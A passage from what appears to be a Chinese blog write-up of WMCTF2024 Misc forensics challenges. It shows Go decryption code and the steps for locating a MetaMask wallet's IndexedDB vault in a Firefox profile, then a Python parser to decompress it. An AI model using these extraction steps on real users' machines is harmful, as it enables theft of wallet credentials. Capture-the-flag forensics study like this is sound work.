class="line">&#125;</span><br><span class="line">deviceKey, err := hex.DecodeString(*key)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Error decoding device key:&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">decryptedData, err := decrypt(data, privateKey, deviceKey)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Error decrypting data:&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">err = ioutil.WriteFile(<span class="string">&quot;decrypted_&quot;</span>+*decryptFile, decryptedData, <span class="number">0644</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Error writing decrypted file:&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;File decrypted successfully!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将前面得到的rsa私钥保存为private_key.pem，然后计算一下前面得到的device_key的sha256用来解密</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924153146026.png" alt="image-20240924153146026"></p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924153209378.png" alt="image-20240924153209378"></p><h3 id="metasecret"><a href="#metasecret" class="headerlink" title="metasecret"></a>metasecret</h3><blockquote><p>当时这题甚至没有思路。。。</p></blockquote><p>在documents中有个password.txt</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924155025770.png" alt="image-20240924155025770"></p><p>题目中的meta指的是metamask插件，我们可以在firefox下找到这个插件，然后去寻找它的idb文件，这里在~&#x2F;AppData&#x2F;Roaming&#x2F;Mozilla&#x2F;Firefox&#x2F;Profiles&#x2F;jawk8d8g.default-release&#x2F;storage&#x2F;default&#x2F;moz-extension+++654e5b4f-4a65-4e1a-9b58-51733b6a2883^userContextId&#x3D;4294967295&#x2F;idb&#x2F;3647222921wleabcEoxlt-eengsairo.files&#x2F;492这个路径下，将其导出</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924160140830.png" alt="image-20240924160140830"></p><p>接下来预期解是对idb文件进行snappy解压，用如下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> snappy</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">import</span> pathlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;A SpiderMonkey StructuredClone object reader for Python.&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># This Source Code Form is subject to the terms of the Mozilla Public</span></span><br><span class="line"><span class="comment"># License, v. 2.0. If a copy of the MPL was not distributed with this</span></span><br><span class="line"><span class="comment"># file, You can obtain one at http://mozilla.org/MPL/2.0/.</span></span><br><span class="line"><span class="comment"># Credits:</span></span><br><span class="line"><span class="comment">#   – Source was havily inspired by</span></span><br><span class="line"><span class="comment">#     https://dxr.mozilla.org/mozilla-central/rev/3bc0d683a41cb63c83cb115d1b6a85d50013d59e/js/src/vm/StructuredClone.cpp</span></span><br><span class="line"><span class="comment">#     and many helpful comments were copied as-is.</span></span><br><span class="line"><span class="comment">#   – Python source code by Alexander Schlarb, 2020.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> enum</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> typing</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ParseError</span>(<span class="title class_ inherited__">ValueError</span>):</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">InvalidHeaderError</span>(<span class="title class_ inherited__">ParseError</span>):</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSInt32</span>(<span class="title class_ inherited__">int</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;Type to represent the standard 32-bit signed integer&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, *a</span>):</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> (-<span class="number">0x80000000</span> &lt;= self &lt;= <span class="number">0x7FFFFFFF</span>):</span><br><span class="line"><span class="keyword">raise</span> TypeError(<span class="string">&quot;JavaScript integers are signed 32-bit values&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSBigInt</span>(<span class="title class_ inherited__">int</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;Type to represent the arbitrary precision JavaScript “BigInt” type&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSBigIntObj</span>(<span class="title class_ inherited__">JSBigInt</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;Type to represent the JavaScript BigInt object type (vs the primitive type)&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSBooleanObj</span>(<span class="title class_ inherited__">int</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;Type to represent JavaScript boolean “objects” (vs the primitive type)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Note: This derives from `int`, since one cannot directly derive from `bool`.&quot;&quot;&quot;</span></span><br><span class="line">__slots__ = ()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">self, inner: <span class="built_in">object</span> = <span class="literal">False</span></span>):</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">int</span>.__new__(<span class="built_in">bool</span>(inner))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__and__</span>(<span class="params">self, other: <span class="built_in">bool</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">bool</span>(self) &amp; other</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__or__</span>(<span class="params">self, other: <span class="built_in">bool</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">bool</span>(self) | other</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__xor__</span>(<span class="params">self, other: <span class="built_in">bool</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">bool</span>(self) ^ other</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__rand__</span>(<span class="params">self, other: <span class="built_in">bool</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line"><span class="keyword">return</span> other &amp; <span class="built_in">bool</span>(self)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__ror__</span>(<span class="params">self, other: <span class="built_in">bool</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line"><span class="keyword">return</span> other | <span class="built_in">bool</span>(self)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__rxor__</span>(<span class="params">self, other: <span class="built_in">bool</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line"><span class="keyword">return</span> other ^ <span class="built_in">bool</span>(self)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self, other: <span class="built_in">bool</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">str</span>(<span class="built_in">bool</span>(self))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">_HashableContainer</span>:</span><br><span class="line">inner: <span class="built_in">object</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, inner: <span class="built_in">object</span></span>):</span><br><span class="line">self.inner = inner</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__hash__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">id</span>(self.inner)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">repr</span>(self.inner)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">str</span>(self.inner)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSMapObj</span>(collections.UserDict):</span><br><span class="line"><span class="string">&quot;&quot;&quot;JavaScript compatible Map object that allows arbitrary values for the key.&quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key_to_hashable</span>(<span class="params">key: <span class="built_in">object</span></span>) -&gt; collections.abc.Hashable:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="built_in">hash</span>(key)</span><br><span class="line"><span class="keyword">except</span> TypeError:</span><br><span class="line"><span class="keyword">return</span> _HashableContainer(key)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__contains__</span>(<span class="params">self, key: <span class="built_in">object</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">super</span>().__contains__(self.key_to_hashable(key))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__delitem__</span>(<span class="params">self, key: <span class="built_in">object</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">super</span>().__delitem__(self.key_to_hashable(key))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, key: <span class="built_in">object</span></span>) -&gt; <span class="built_in">object</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">super</span>().__getitem__(self.key_to_hashable(key))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>) -&gt; typing.Iterator[<span class="built_in">object</span>]:</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">super</span>().__iter__():</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">isinstance</span>(key, _HashableContainer):</span><br><span class="line">key = key.inner</span><br><span class="line"><span class="keyword">yield</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__setitem__</span>(<span class="params">self, key: <span class="built_in">object</span>, value: <span class="built_in">object</span></span>):</span><br><span class="line"><span class="built_in">super</span>().__setitem__(self.key_to_hashable(key), value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSNumberObj</span>(<span class="title class_ inherited__">float</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;Type to represent JavaScript number/float “objects” (vs the primitive type)&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSRegExpObj</span>:</span><br><span class="line">expr:  <span class="built_in">str</span></span><br><span class="line">flags: <span class="string">&#x27;RegExpFlag&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, expr: <span class="built_in">str</span>, flags: <span class="string">&#x27;RegExpFlag&#x27;</span></span>):</span><br><span class="line">self.expr  = expr</span><br><span class="line">self.flags = flags</span><br><span class="line"></span><br><span class="line"><span class="meta">@classmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">from_re</span>(<span class="params">cls, regex: re.Pattern</span>) -&gt; <span class="string">&#x27;JSRegExpObj&#x27;</span>:</span><br><span class="line">flags = RegExpFlag.GLOBAL</span><br><span class="line"><span class="keyword">if</span> regex.flags | 